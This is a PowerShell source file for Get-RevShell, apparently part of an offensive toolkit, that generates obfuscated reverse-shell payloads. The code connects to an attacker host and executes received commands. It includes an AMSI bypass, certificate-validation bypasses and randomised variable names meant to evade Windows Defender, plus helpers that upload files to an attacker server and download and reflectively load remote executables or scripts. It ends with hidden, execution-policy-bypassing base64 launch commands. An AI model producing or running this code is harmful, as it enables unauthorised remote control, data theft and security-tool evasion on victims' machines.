function Get-RevShell {
#.SYNOPSIS
# Modular and Robust PowerShell Reverse Shell Generator focused on Basic AMSI Evasion
# ARBITRARY VERSION NUMBER:  3.5.3
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# Originally developed for OSEP, this tool has been overhauled to create modular, robust custom reverse shells
# with randomly generated variables that can bypass Windows Defender, provide seemless encryption, and have 
# built-in functions for intuitive lateral file transfers.
#
# Overview:
#  [+] Base reverse shell has built-in error output and support for information output streams (PowerShell 5.0+)
#  [+] Optional PowerShell 2.0 support removes information output streams, but is completely backwards compatible.
#  [+] Optional HTTPS bypass removes self-signed certificate callback checks from the current session, allowing
#      seemless communication with pma_server.py server over HTTPS.
#  [+] Optional "WebClientHelpers" will add 'download', 'upload', and 'import' functionality into the reverse
#      shell, seemlessly communicating with the custom 'pma_server.py' web server for lateral file transfers.  The
#      'import' fuctionality will attempt to remotely load hosted files into the session.  If the filename ends
#      with '.dll' or '.exe', the function will attempt .NET reflection. Otherwise, the function will attempt to
#      load the file assuming it contains PowerShell code.
#
# Usage Notes:
#  [+] Using the '-SSL' or '-HttpsBypass' parameters without any form of Reflection uses the Add-Type cmdlet, which
#      technically touches disk when compiling/defining custom .NET Framework code.
#  [+] Using '-WebClientHelpers' by default sets the target URL to use HTTP on port 80.  If '-HttpsBypass' is used
#      in conjuction with this parameter, the target URL will be set to use HTTPS on port 443.
#  [+] 'SSC.dll' is a pre-compiled assembly that contains the .NET code for both the '-SSL' and '-HttpsBypass'. 
#  [+] When using the '-SSL' parameter, your listener is recommended to be 'ncat --ssl -lnvp <port>'.
#
# Parameters:
#
#    Main Functionality
#      -IPAddress             -->   Attacker IP address or hostname (required)
#      -Port                  -->   Attacker listening port (required)
#      -Raw                   -->   Return reverse shell payload in cleartext rather than base64
#      -Help                  -->   Return Get-Help information
#
#    Modular Options
#      -AmsiBypass            -->   Disable AMSI in current session
#      -SSL                   -->   Encrypt reverse shell via SSL with self-signed certificates
#      -HttpsBypass           -->   Disable HTTPS self-signed certificate checks in the session
#      -B64Reflection         -->   Reflects a static Base64 string of 'SSC.dll' instead of using Add-Type in the payload
#      -PowerShell2Support    -->   Adjust the reverse shell payload to use PowerShell 2.0
#      -Binary                -->   PowerShell binary to use (default: 'powershell')
#      -Headless              -->   Create reverse shell payload without '-nop -ex bypass -wi h' parameters
#      -Verbose               -->   Make reverse shell variables descriptive instead of randomly generated
#
#    PMA Server Compatibility (Static)
#      -RemoteReflection      -->   Remotely reflect 'SSC.dll' from the revshell IP address instead of using Add-Type in the payload
#      -WebClientHelpers      -->   Add WebClientHelpers ('download','upload','import') into the revshell, pointing to the revshell IP address
#      -WebClientOpsec        -->   WebClientHelpers, but hiding filename requests in the HTTP request headers instead of in the URL.
#
#    PMA Server Compatibility (Specified)
#      -RemoteReflectionURL   -->   Specific URL hosting 'SSC.dll' to reflect (e.g., 'http(s)://<ip_addr>/SSC.dll')
#      -WebClientHelpersURL   -->   Specific URL of 'pma_server.py' to point WebClientHelpers to (e.g., 'http(s)://<ip_addr>')
#      -WebClientOpsecURL     -->   Specific URL of 'pma_server.py' to point WebClientHelpers to via OPSEC method.
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        # Primary Parameters
        [String]$IPAddress,
        [int]   $Port,
        [switch]$Raw,
        [switch]$Help,
        
        # Modular Options
        [switch]$AmsiBypass,
        [switch]$SSL,
        [switch]$HttpsBypass,
        [switch]$B64Reflection,
        [switch]$PowerShell2Support,
        [string]$Binary = 'powershell',
        [switch]$Headless,
        [switch]$Verbose,

        # PMA Server Compatibility (Static)
        [switch]$RemoteReflection,
        [switch]$WebClientHelpers,
        [switch]$WebClientOpsec,

        # PMA Server Compatibilty (Specified)
        [string]$RemoteReflectionURL = 'http://<ip_addr>/SSC.dll',
        [string]$WebClientHelpersURL = 'http(s)://<ip_addr>',
        [string]$WebClientOpsecURL   = 'http(s)://<ip_addr>'
    )


    # Return Get-Help Information
    if ($Help) { return Get-Help Get-RevShell }


    # General Error Correction
    if (!$IPAddress)                             { return (Write-Host '[-] Missing IP address.' -ForegroundColor Red)  }
    if (!$Port)                                  { return (Write-Host '[-] Missing port.' -ForegroundColor Red)        }
    elseif (($Port -lt 1) -or ($Port -gt 65535)) { return (Write-Host '[-] Invalid port number.' -ForegroundColor Red) }


    # WebClientHelpers Validation
    if (($WebClientOpsecURL -ne 'http(s)://<ip_addr>') -or ($WebClientOpsec)) {
        $UseOPSEC = $TRUE
        if ($WebClientOpsecURL -ne 'http(s)://<ip_addr>') { $WebClientHelpersURL = $WebClientOpsecURL }
        if ($WebClientOpsec) { $WebClientHelpers = $TRUE }
    }
    if ($WebClientHelpersURL -ne 'http(s)://<ip_addr>') {
        if ($WebClientHelpersURL -notlike "http*")                     { return (Write-Host '[-] Invalid URL.' -ForegroundColor Red) }
        if (($WebClientHelpersURL -like "https:*") -and !$HttpsBypass) { return (Write-Host '[-] HTTPS bypass required to communicate over SSL.' -ForegroundColor Red) }
    }
    elseif ($WebClientHelpers) {
        if ($HttpsBypass) { $WebClientHelpersURL = "https://$IPAddress" }
        else              { $WebClientHelpersURL = "http://$IPAddress"  }
    }
    else { $WebClientHelpersURL = $NULL }


    # RemoteReflection Validation
    if ($RemoteReflectionURL -ne 'http://<ip_addr>/SSC.dll') {
        if ($RemoteReflectionURL -notlike "http*") { return (Write-Host '[-] Invalid URL.' -ForegroundColor Red) }
        if ($RemoteReflectionURL -like "https:*")  { return (Write-Host '[-] HTTPS hosted .dll contains the required HTTPS bypass for communication.' -ForegroundColor Red) }
        if ($B64Reflection)                        { return (Write-Host '[-] Must choose either default, base64 reflection, or remote reflection.' -ForegroundColor Red)    }
    }
    elseif ($RemoteReflection) {
        if ($HttpsBypass) { return (Write-Host '[-] HTTPS hosted .dll contains the required HTTPS bypass for communication.' -ForegroundColor Red) }
        else              { $RemoteReflectionURL = "http://$IPAddress/SSC.dll" }
    }
    else { $RemoteReflectionURL = $NULL }


    ### Internal Functions ###

    function Get-RandVar {
        
        # Randomly generate 6 - 12 character variable names
        $RanVar = '$'
        for ($i=0; $i -lt (Get-Random -Maximum 6 -Minimum 3); $i++) {
            $RanVar += Get-Random -InputObject ([char[]](([char]'a')..([char]'z')))
            $RanVar += Get-Random -InputObject ([char[]](([char]'A')..([char]'Z')))
        }

        return $RanVar
    }

    function Generate-SSCmodule ([switch]$Remote, [switch]$Base64) {

        # Point to a pre-compiled self-signed certificate C# module to load remotely.
        if ($Remote) {
            
            <# Note
            # This was pre-compiled using the following command:
            Add-Type $Var9 -OutputAssembly SSC.dll
            #>

            if ($PowerShell2Support) { $SSCmodule = "[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('$RemoteReflectionURL'))`n" }
            else                     { $SSCmodule = "[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData('$RemoteReflectionURL'))`n"     }
        }


       # Reflect the raw base64 string to avoid compiling cleartext code on on the victim with Add-Type
        elseif ($Base64) {
            
            <# Note
            # This raw base64 string was created with the following command:  
            [Convert]::ToBase64String((Get-Content SSC.dll -Encoding Byte -Raw))

            # The above command won't work on PowerShell Core, but the following does:
            [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$PWD/SSC.dll"))
            #>
            
            $SSCmodule =  "$Var9 = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAF/Fz2UAAAAAAAAAAOAAAiELAQsAAAYAAAAGAAAAAAAA/iQAAAAgAAAAQAAAAAAAEAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAKQkAABXAAAAAEAAAJgCAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAABAUAAAAgAAAABgAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAJgCAAAAQAAAAAQAAAAIAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAGAAAAACAAAADAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAADgJAAAAAAAAEgAAAACAAUAgCAAACQEAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoXKooU/gYBAAAGcwMAAAooBAAAChcoBQAACiAADAAAKAYAAAoqHgIoBwAACioAAEJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAFABAAAjfgAAvAEAAOwBAAAjU3RyaW5ncwAAAACoAwAACAAAACNVUwCwAwAAEAAAACNHVUlEAAAAwAMAAGQAAAAjQmxvYgAAAAAAAAACAAABRxUAAAkAAAAA+iUzABYAAAEAAAAJAAAAAgAAAAMAAAAEAAAABwAAAAIAAAABAAAAAgAAAAAACgABAAAAAAAGADQALQAGAGkAOwAKAHkAOwAKAJcAgwAGAPoA2gAGABoB2gAKAD4BgwAKAG0BYgEKAL8BYgEAAAAAAQAAAAAAAQABAAEAEAAUAAAABQABAAEAUCAAAAAAlgCnAAoAAQBTIAAAAACWAK4AFQAFAHYgAAAAAIYYvgAZAAUAAAABAMQAAAACAMgAAAADAM0AAAAEANMAKQC+AB0AMQC+ABkAOQC+ACIAQQCBASgAQQCpAS4AQQDUATMACQC+ABkALgALADkALgATAEIABIAAAAAAAAAAAAAAAAAAAAAAOAEAAAQAAAAAAAAAAAAAAAEAJAAAAAAABAAAAAAAAAAAAAAAAQAtAAAAAAAAAAA8TW9kdWxlPgBTU0N2Mi5kbGwAU2VsZlNpZ25lZENlcnRzAG1zY29ybGliAFN5c3RlbQBPYmplY3QAU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5YNTA5Q2VydGlmaWNhdGVzAFg1MDlDZXJ0aWZpY2F0ZQBYNTA5Q2hhaW4AU3lzdGVtLk5ldC5TZWN1cml0eQBTc2xQb2xpY3lFcnJvcnMAQnlwYXNzAFdlYkNsaWVudEJ5cGFzcwAuY3RvcgBvYmoAY2VydABjaGFpbgBlcnJvcnMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFNTQ3YyAFJlbW90ZUNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrAFN5c3RlbS5OZXQAU2VydmljZVBvaW50TWFuYWdlcgBzZXRfU2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sAc2V0X0V4cGVjdDEwMENvbnRpbnVlAFNlY3VyaXR5UHJvdG9jb2xUeXBlAHNldF9TZWN1cml0eVByb3RvY29sAAAAAAADIAAAAAAASNDyn/ihA0K/Ojyp9LnGCQAIt3pcVhk04IkKAAQCHBIJEg0REQMAAAEDIAABBCABAQgFIAIBHBgFAAEBEh0EAAEBAgUAAQERJQgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAAADMJAAAAAAAAAAAAADuJAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4CQAAAAAAAAAAAAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAPAIAAAAAAAAAAAAAPAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBJwBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAHgBAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAwAC4AMAAuADAALgAwAAAANAAKAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABTAFMAQwB2ADIALgBkAGwAbAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAAA8AAoAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAUwBTAEMAdgAyAC4AZABsAGwAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwAAAAANQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA='`n"
            $SSCmodule += "[System.Reflection.Assembly]::Load(([Convert]::FromBase64String($Var9)))`n"
        }


        # Compile self-signed certificate C# module in cleartext on the victim using Add-Type
        else {
            $SSCmodule = @"
$Var9 = @'
using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public class SelfSignedCerts
{
    public static bool Bypass (Object obj, X509Certificate cert, X509Chain chain, SslPolicyErrors errors)
    {
        return true;
    }
    public static SslStream Stream(TcpClient client)
    {
        return new SslStream(client.GetStream(), false, new RemoteCertificateValidationCallback(Bypass), null);
    }
    public static void WebClientBypass()
    {
        ServicePointManager.ServerCertificateValidationCallback = Bypass;
        ServicePointManager.Expect100Continue = true;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
    }
}
'@
Add-Type $Var9`n
"@
        }

        return $SSCmodule
    }
   
    function Generate-HttpsBypass {
        
        # HTTPS Certificate Check Bypass
        $Bypass1 = "[SelfSignedCerts]::WebClientBypass()`n"

        return $Bypass1
    }

    function Generate-AmsiBypass {

        # Last Validated: 18 February 2024

        $Bypass2 =  "$Var10 = [Ref].Assembly.GetTypes() | % {if (`$_.Name -like '*Am*s*ils*') {`$_.GetFields('NonPublic,Static') | ? {`$_.Name -like '*ailed*'}}}`n"
        $Bypass2 += "$Var10.SetValue(`$NULL,`$TRUE)`n"

        return $Bypass2
    }

    function Generate-WebClientHelpers ([switch]$Classic, [switch]$Opsec) {

        
        # Add a "download", "upload", and "import" functionality to reverse shell

        # Filename within URL
        if ($Classic) {
            $WebClient = @"
function upload ([string]`$File) {
    $Var11 = `$File
    if (!$Var11) { return '[-] Must input file.' }
    if (!(Test-Path -LiteralPath $Var11)) { return '[-] File not found.' }
    $Var12 = (Get-Item -LiteralPath $Var11).Name
    $Var13 = (Get-Item -LiteralPath $Var11).FullName
    $Var16 = (New-Object System.Net.WebClient)
    $Var14 = $Var16.UploadFile("$WebClientHelpersURL/$Var12",$Var13)
    return [System.Text.Encoding]::Ascii.GetString($Var14)
}
function download ([string]`$File) {
    $Var11 = `$File
    if (!$Var11) { return '[-] Must input file.' }
    $Var13 = (`$PWD).Path + "/$Var11"
    Try {
        $Var16 = (New-Object System.Net.WebClient)
        $Var16.DownloadFile("$WebClientHelpersURL/$Var11",$Var13) 2>`$NULL
        if (Test-Path -LiteralPath $Var11) { return '[+] Download successful.' } }
    Catch [System.Net.WebException] { return '[-] File not found.' }
    Catch { return '[-] Download unsuccessful.' }
}
function import ([string]`$File) {
    $Var11 = `$File
    if (!$Var11) { return '[-] Must input file.' }
    $Var16 = (New-Object System.Net.WebClient)
    Try {
        if (($Var11 -like '*.exe') -or ($Var11 -like '*.dll')) {
            [System.Reflection.Assembly]::Load($Var16.DownloadData("$WebClientHelpersURL/$Var11")) 1>`$NULL
            return '[+] Reflection successful.' }
        else {
            $Var15 = $Var16.DownloadString("$WebClientHelpersURL/$Var11")
            if (!($Var15 -like '*function global:*')) {$Var15 = $Var15 -ireplace [regex]::Escape('function '),'function global:'}
            Invoke-Expression ($Var15)
            return '[+] Import successful.' } }
    Catch { return '[-] Import unsuccessful.' }
}`n
"@
        }

        # Filename within HTTP headers
        elseif ($Opsec) {
            $WebClient = @"
function upload ([string]`$File) {
    $Var11 = `$File
    if (!$Var11) { return '[-] Must input file.' }
    if (!(Test-Path -LiteralPath $Var11)) { return '[-] File not found.' }
    $Var12 = (Get-Item -LiteralPath $Var11).Name
    $Var13 = (Get-Item -LiteralPath $Var11).FullName
    $Var16 = (New-Object System.Net.WebClient)
    $Var16.Headers.Add('file',$Var12)
    $Var14 = $Var16.UploadFile("$WebClientHelpersURL",$Var13)
    return [System.Text.Encoding]::Ascii.GetString($Var14)
}
function download ([string]`$File) {
    $Var11 = `$File
    if (!$Var11) { return '[-] Must input file.' }
    $Var13 = (`$PWD).Path + "/$Var11"
    Try {
        $Var16 = (New-Object System.Net.WebClient)
        $Var16.Headers.Add('file',$Var11)
        $Var16.DownloadFile("$WebClientHelpersURL",$Var13) 2>`$NULL
        if (Test-Path -LiteralPath $Var11) { return '[+] Download successful.' } }
    Catch [System.Net.WebException] { return '[-] File not found.' }
    Catch { return '[-] Download unsuccessful.' }
}
function import ([string]`$File) {
    $Var11 = `$File
    if (!$Var11) { return '[-] Must input file.' }
    $Var16 = (New-Object System.Net.WebClient)
    $Var16.Headers.Add('file',$Var11)
    Try {
        if (($Var11 -like '*.exe') -or ($Var11 -like '*.dll')) {
            [System.Reflection.Assembly]::Load($Var16.DownloadData("$WebClientHelpersURL")) 1>`$NULL
            return '[+] Reflection successful.' }
        else {
            $Var15 = $Var16.DownloadString("$WebClientHelpersURL")
            if (!($Var15 -like '*function global:*')) {$Var15 = $Var15 -ireplace [regex]::Escape('function '),'function global:'}
            Invoke-Expression ($Var15)
            return '[+] Import successful.' } }
    Catch { return '[-] Import unsuccessful.' }
}`n
"@
}

        return $WebClient
    }

    function Generate-ReverseShell {
        
        # Create a custom PowerShell 2.0+ backwards compatible shell
        if ($PowerShell2Support) {
        
            # Socket 
            $RevshellSocket = "$Var1 = New-Object -TypeName System.Net.Sockets.TcpClient('$IPAddress', $Port)`n"

            # Stream
            if ($SSL) {
                $RevshellStream =  "$Var2 = [SelfSignedCerts]::Stream($Var1)`n"
                $RevshellStream += "$Var2.AuthenticateAsClient('')`n"
            }
            else { $RevshellStream = "$Var2 = $Var1.GetStream()`n" }

            # Body
            $RevshellBody = @"
[byte[]]$Var3 = 0..65535 | % {0}
$Var4 = New-Object -TypeName System.IO.StringWriter
[System.Console]::SetOut($Var4)
while ((`$i = $Var2.Read($Var3,0,$Var3.Length)) -ne 0) {
    Try {
        $Var5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Var3,0,`$i)
        $Var6 = (iex $Var5 2>&1 | Out-String)
    } Catch {$Var6 = "`$(`$Error[0])``n"}
    $Var4.Write($Var6)
    $Var7 = $Var4.ToString() + 'PS ' + (PWD).Path + '> '
    $Var8 = ([Text.Encoding]::ASCII).GetBytes($Var7)
    $Var2.Write($Var8,0,$Var8.Length)
    $Var2.Flush()
    $Var4.GetStringBuilder().Clear() | Out-Null
}
$Var4.Close()
$Var1.Close()
"@
        }


        # Create a more robust PowerShell 5.0+ compatible shell
        else {
            
            # Socket 
            $RevshellSocket = "$Var1 = [System.Net.Sockets.TCPClient]::new('$IPAddress',$Port)`n"

            # Stream
            if ($SSL) {
                $RevshellStream =  "$Var2 = [SelfSignedCerts]::Stream($Var1)`n"
                $RevshellStream += "$Var2.AuthenticateAsClient('')`n"
            }
            else { $RevshellStream = "$Var2 = $Var1.GetStream()`n" }

            # Body
            $RevshellBody = @"
[byte[]]$Var3 = 0..65535 | % {0}
$Var4 = [System.IO.StringWriter]::new()
[System.Console]::SetOut($Var4)
while ((`$i = $Var2.Read($Var3,0,$Var3.Length)) -ne 0) {
    Try {
        $Var5 = [System.Text.ASCIIEncoding]::new().GetString($Var3,0,`$i)
        $Var6 = (iex $Var5 *>&1 | Out-String)
    } Catch {$Var6 = "`$(`$Error[0])``n"}
    $Var4.Write($Var6)
    $Var7 = $Var4.ToString() + 'PS ' + (PWD).Path + '> '
    $Var8 = ([Text.Encoding]::ASCII).GetBytes($Var7)
    $Var2.Write($Var8,0,$Var8.Length)
    $Var2.Flush()
    $Var4.GetStringBuilder().Clear() | Out-Null
}
$Var4.Close()
$Var1.Close()
"@

        }


        # Return finalized shell
        $Revshell = $RevshellSocket + $RevshellStream + $RevshellBody
        return $Revshell
    }


    ### Main Function ###

    # Descriptive Reverse Shell Variable Names
    if ($Verbose) {
        # Reverse Shell
        $Var1  = '$RevShellClient'
        $Var2  = '$Stream'
        $Var3  = '$DataBuffer'
        $Var4  = '$OutputBuffer'
        $Var5  = '$Command'
        $Var6  = '$CommandOutput'
        $Var7  = '$PromptString'
        $Var8  = '$PromptBytes'

        # SSL / HTTPS Bypass
        $Var9  = '$CertificateBypasses'

        # AMSI Bypass
        $Var10 = '$AmsiBypass'

        # WebClientHelpers
        $Var11 = '$File'
        $Var12 = '$FileName'
        $Var13 = '$FilePath'
        $Var14 = '$Response'
        $Var15 = '$Contents'
        $Var16 = '$WebClient'
    }

    # Randomly Generate Variable Names
    else {
        # Reverse Shell
        $Var1  = Get-RandVar # RevShellClient
        $Var2  = Get-RandVar # Stream
        $Var3  = Get-RandVar # DataBuffer
        $Var4  = Get-RandVar # OutputBuffer
        $Var5  = Get-RandVar # Command
        $Var6  = Get-RandVar # CommandOutput
        $Var7  = Get-RandVar # PromptString
        $Var8  = Get-RandVar # PromptBytes
        
        # SSL / HTTPS Bypass
        $Var9  = Get-RandVar # SSCmodule

        # AMSI Bypass
        $Var10 = Get-RandVar # AmsiBypass

        # WebClientHelpers
        $Var11 = Get-RandVar # File
        $Var12 = Get-RandVar # FileName
        $Var13 = Get-RandVar # FilePath
        $Var14 = Get-RandVar # Response
        $Var15 = Get-RandVar # Contents
        $Var16 = Get-RandVar # WebClient
    }


    # Add Self-Signed Certificate C# Module
    if ($HttpsBypass -or $SSL) { 
        if     ($B64Reflection)       { $SSCmodule = Generate-SSCmodule -Base64 }
        elseif ($RemoteReflectionURL) { $SSCmodule = Generate-SSCmodule -Remote }
        else                          { $SSCmodule = Generate-SSCmodule         }
    }
    else { $SSCmodule = $NULL }


    # Add Https Certificate Check Bypass
    if ($HttpsBypass) { $Bypass1 = Generate-HttpsBypass }
    else              { $Bypass1 = $NULL                }


    # Add Amsi Bypass
    if ($AmsiBypass) { $Bypass2 = Generate-AmsiBypass }
    else             { $Bypass2 = $NULL               }


    # Add WebClient Helper Tools
    if ($WebClientHelpersURL-and !$UseOPSEC)     { $WebClient = Generate-WebClientHelpers -Classic }
    elseif ($WebClientHelpersURL -and $UseOPSEC) { $WebClient = Generate-WebClientHelpers -Opsec   }
    else                                         { $WebClient = $NULL                              }


    # Add Primary Reverse Shell Payload
    $Revshell = Generate-ReverseShell


    # Assemble Finalized Payload
    $Payload = $SSCmodule + $Bypass1 + $Bypass2 + $WebClient + $RevShell
    
    
    # Toggle PowerShell 2
    if ($PowerShell2Support) { $BinParams = $Binary + ' -version 2' }
    else                     { $BinParams = $Binary                 }


    # Toggle '-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden' PowerShell Parameters
    if (!$Headless) { $BinParams += ' -nop -ex bypass -wi h' } 
     

    # Cleartext or Base64 Payload
    if (!$Raw) { $FinalPayload = "$BinParams -e " + [convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($Payload)) }
    else       { $FinalPayload = "$BinParams -c {$Payload}" }


    return $FinalPayload
}